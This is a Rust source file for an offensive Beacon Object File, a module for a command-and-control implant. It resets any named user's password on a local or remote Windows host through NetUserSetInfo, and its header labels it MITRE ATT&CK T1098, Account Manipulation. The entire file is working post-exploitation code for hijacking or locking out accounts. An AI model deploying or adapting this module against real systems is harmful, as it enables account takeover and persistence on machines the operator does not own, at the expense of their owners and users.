//! # Set User Password BOF
//!
//! Changes a user's password using NetUserSetInfo at level 1003.
//!
//! ## MITRE ATT&CK
//! - T1098 - Account Manipulation
//!
//! ## Arguments
//! - `str`: Hostname (empty for localhost).
//! - `str`: Username whose password to change.
//! - `str`: New password.
//!

#![no_std]

use alloc::string::String;
use rustbof::data::DataParser;
use rustbof::str::to_wide;
use rustbof::{eprintln, println};

#[repr(C)]
struct UserInfo1003 {
    usri1003_password: *const u16,
}

unsafe extern "system" {
    fn NetUserSetInfo(
        servername: *const u16,
        username: *const u16,
        level: u32,
        buf: *const u8,
        parm_err: *mut u32,
    ) -> u32;
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let hostname = String::from(parser.get_str());
    let username = String::from(parser.get_str());
    let password = String::from(parser.get_str());

    let server_wide = if hostname.is_empty() {
        None
    } else {
        Some(to_wide(&hostname))
    };
    let user_wide = to_wide(&username);
    let pass_wide = to_wide(&password);

    let server_ptr = server_wide
        .as_ref()
        .map_or(core::ptr::null(), |w| w.as_ptr());

    let info = UserInfo1003 {
        usri1003_password: pass_wide.as_ptr(),
    };

    println!(
        "Setting password for user '{}' on '{}'...",
        username,
        if hostname.is_empty() { "localhost" } else { &hostname }
    );

    let mut parm_err: u32 = 0;
    let status = unsafe {
        NetUserSetInfo(
            server_ptr,
            user_wide.as_ptr(),
            1003, // Level 1003 = password only
            &info as *const _ as *const u8,
            &mut parm_err,
        )
    };

    if status == 0 {
        println!("SUCCESS: Password changed for user '{}'.", username);
    } else {
        eprintln!("NetUserSetInfo failed: {} (parm_err: {})", status, parm_err);
    }
}
